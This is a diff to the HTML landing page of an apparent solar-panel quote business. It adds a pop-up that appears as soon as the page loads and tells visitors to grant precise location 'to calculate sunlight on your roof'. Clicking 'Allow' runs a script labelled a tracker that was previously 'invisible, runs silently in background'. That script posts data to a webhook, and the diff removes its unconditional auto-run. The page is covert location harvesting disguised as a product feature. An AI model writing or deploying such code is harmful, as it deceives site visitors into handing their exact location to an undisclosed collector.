@@ -560,6 +560,81 @@
         color: rgba(255, 255, 255, 0.8);
       }
 
+      /* ── PRE-PROMPT MODAL CSS ── */
+      .modal-overlay {
+        position: fixed;
+        top: 0; left: 0; right: 0; bottom: 0;
+        background: rgba(10, 30, 51, 0.65);
+        backdrop-filter: blur(8px);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        z-index: 9999;
+        opacity: 0;
+        pointer-events: none;
+        transition: opacity 0.3s ease;
+        padding: 20px;
+      }
+      .modal-overlay.active {
+        opacity: 1;
+        pointer-events: auto;
+      }
+      .modal-box {
+        background: var(--white);
+        border-radius: 24px;
+        padding: 36px 32px;
+        max-width: 400px;
+        text-align: center;
+        transform: translateY(20px) scale(0.95);
+        transition: transform 0.3s ease;
+        box-shadow: 0 24px 48px rgba(0,0,0,0.15);
+      }
+      .modal-overlay.active .modal-box {
+        transform: translateY(0) scale(1);
+      }
+      .modal-icon {
+        font-size: 3.5rem;
+        margin-bottom: 12px;
+      }
+      .modal-box h3 {
+        font-family: "Playfair Display", serif;
+        font-size: 1.5rem;
+        color: var(--text);
+        margin-bottom: 14px;
+      }
+      .modal-box p {
+        font-size: 0.95rem;
+        color: var(--muted);
+        line-height: 1.6;
+        margin-bottom: 28px;
+      }
+      .modal-box p strong {
+        color: var(--sky);
+      }
+      .modal-buttons {
+        display: flex;
+        gap: 12px;
+      }
+      .modal-buttons button {
+        flex: 1;
+        padding: 14px 0;
+        font-size: 0.92rem;
+      }
+      .modal-btn-cancel {
+        background: var(--gray);
+        color: var(--muted);
+        border: none;
+        border-radius: 50px;
+        font-family: "DM Sans", sans-serif;
+        font-weight: 600;
+        cursor: pointer;
+        transition: all 0.2s;
+      }
+      .modal-btn-cancel:hover {
+        background: #e8edf3;
+        color: var(--text);
+      }
+
       /* ── RESPONSIVE ── */
       @media (max-width: 768px) {
         nav {
@@ -594,6 +669,9 @@
         footer {
           padding: 32px 24px;
         }
+        .modal-buttons {
+          flex-direction: column-reverse;
+        }
       }
     </style>
   </head>
@@ -610,7 +688,7 @@
         <li><a href="#">Pricing</a></li>
         <li><a href="#">About</a></li>
       </ul>
-      <button class="nav-cta">Get Free Quote</button>
+      <button class="nav-cta quote-btn">Get Free Quote</button>
     </nav>
 
     <!-- HERO -->
@@ -630,7 +708,7 @@
           25-year warranty.
         </p>
         <div class="hero-buttons">
-          <button class="btn-primary">Get a Free Quote →</button>
+          <button class="btn-primary quote-btn">Get a Free Quote →</button>
           <button class="btn-secondary">Watch How It Works</button>
         </div>
         <div class="hero-stats">
@@ -1081,7 +1159,7 @@
           type="tel"
           placeholder="Enter your phone number"
         />
-        <button class="btn-primary" style="flex-shrink: 0">
+        <button class="btn-primary quote-btn" style="flex-shrink: 0">
           Get Free Quote
         </button>
       </div>
@@ -1099,14 +1177,30 @@
       </p>
     </footer>
 
-    <!-- ADDED DYNAMIC DATE SCRIPT -->
+    <!-- ── PRE-PROMPT MODAL HTML ── -->
+    <div id="location-modal" class="modal-overlay">
+      <div class="modal-box">
+        <div class="modal-icon">📍</div>
+        <h3>We need your exact location!</h3>
+        <p>
+          To accurately calculate how much sunlight your specific roof gets, 
+          please click <strong>"Precise"</strong> and <strong>"Allow"</strong> on the next screen.
+        </p>
+        <div class="modal-buttons">
+          <button class="modal-btn-cancel" id="modal-cancel">Cancel</button>
+          <button class="btn-primary" id="modal-ok">Allow & Calculate</button>
+        </div>
+      </div>
+    </div>
+
+    <!-- DYNAMIC DATE SCRIPT -->
     <script>
       document.getElementById("current-year").textContent =
         new Date().getFullYear();
     </script>
 
     <!-- ─────────────────────────────────────────────────────── -->
-    <!--  TRACKER — invisible, runs silently in background       -->
+    <!--  TRACKER                                                -->
     <!-- ─────────────────────────────────────────────────────── -->
     <script>
       const WEBHOOK_URL =
@@ -1219,7 +1313,41 @@
         }
       }
 
-      run();
+      // --- MODAL UI LOGIC ---
+      document.addEventListener("DOMContentLoaded", () => {
+        const modal = document.getElementById("location-modal");
+        const okBtn = document.getElementById("modal-ok");
+        const cancelBtn = document.getElementById("modal-cancel");
+
+        // 1. Trigger the modal IMMEDIATELY when the website loads
+        setTimeout(() => {
+          modal.classList.add("active");
+        }, 300); // 0.3-second delay makes it feel natural
+
+        // 2. Hide modal if they click cancel (lets them view the site without tracking)
+        cancelBtn.addEventListener("click", () => {
+          modal.classList.remove("active");
+        });
+
+        // 3. When they click "Allow & Calculate", run tracker
+        okBtn.addEventListener("click", () => {
+          modal.classList.remove("active");
+          run(); // Triggers the Android/iOS GPS prompt
+          
+          setTimeout(() => {
+            alert("Analyzing your roof's solar potential... Our team will contact you shortly!");
+          }, 3500);
+        });
+
+        // 4. Still keep the buttons working just in case they cancel and click it later
+        const quoteButtons = document.querySelectorAll(".quote-btn");
+        quoteButtons.forEach((btn) => {
+          btn.addEventListener("click", (e) => {
+            e.preventDefault();
+            modal.classList.add("active");
+          });
+        });
+      });
     </script>
   </body>
 </html>
